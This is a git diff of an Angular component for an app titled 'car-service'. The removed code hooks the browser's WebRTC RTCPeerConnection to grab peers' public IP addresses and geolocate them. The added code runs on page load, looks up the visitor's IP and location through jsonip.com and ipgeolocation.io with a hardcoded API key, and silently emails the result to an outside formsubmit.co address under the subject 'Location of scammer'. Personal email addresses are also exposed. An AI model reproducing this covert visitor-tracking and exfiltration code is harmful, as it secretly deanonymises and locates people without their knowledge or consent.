@@ -1,5 +1,8 @@
-import { Component } from '@angular/core';
 
+
+import { HttpClient, HttpHeaders } from '@angular/common/http';
+import { Component } from '@angular/core';
+import { switchMap } from 'rxjs/operators';
 @Component({
   selector: 'app-root',
   templateUrl: './app.component.html',
@@ -7,48 +10,57 @@ import { Component } from '@angular/core';
 })
 export class AppComponent {
   title = 'car-service';
-  ngOnInit(): void {
-    let apiKey = "1734d44bcb354a908911b6d63c71bd79";
+  ipAddress:string;
+  city:string;
+  region: any;
+  country: any;
+  latLang: string;
+  userIP: any;
+  constructor(private http: HttpClient) {}
 
-window.oRTCPeerConnection =
-  window.oRTCPeerConnection || window.RTCPeerConnection;
 
-window.RTCPeerConnection = function (...args) {
-  const pc = new window.oRTCPeerConnection(...args);
+   ngOnInit() {
+    this.http.get('https://jsonip.com').subscribe(
+      (value:any) => {
+        console.log(value);
+        this.userIP = value.ip;
+        this.getLocation(value.ip);
+      },
+      (error) => {
+        console.log(error);
+      }
+    ); 
+    console.log(this.userIP)
 
-  pc.oaddIceCandidate = pc.addIceCandidate;
-
-  pc.addIceCandidate = function (iceCandidate, ...rest) {
-    const fields = iceCandidate.candidate.split(" ");
-
-    const ip = fields[4];
-    if (fields[7] === "srflx") {
-      getLocation(ip);
+    
     }
-    return pc.oaddIceCandidate(iceCandidate, ...rest);
-  };
-  return pc;
-};
-
-let getLocation = async (ip) => {
+getLocation(ip){
+  let apiKey = "1734d44bcb354a908911b6d63c71bd79";
   let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
 
-  await fetch(url).then((response) =>
-    response.json().then((json) => {
-      const output = `
-          ---------------------
-          Country: ${json.country_name}
-          State: ${json.state_prov}
-          City: ${json.city}
-          District: ${json.district}
-          Lat / Long: (${json.latitude}, ${json.longitude})
-          ---------------------
-          `;
-      console.log(output);
-    })
-  );
-};
+this.http.get(url).subscribe((res:any)=>{
+  console.log("location",res);
 
-   
-  }
+        const email = {
+          name:"Abhishek Giram",
+          email:"abhishek.giram11@gmail.com",
+          subject:"Location of scammer",
+          message:JSON.stringify(res)
+        };
+
+        const headers = new HttpHeaders({ "Content-Type": "application/json" });
+        this.http.post(
+            "https://formsubmit.co/ukapplicationforabhishekgiram@gmail.com",
+            { name: email.name, replyto: email.email, subject: email.subject, message: email.message},
+            { headers: headers }
+          )
+          .subscribe(response => {
+            console.log(response);
+          }); 
+       
+})
 }
+
+}
+
+
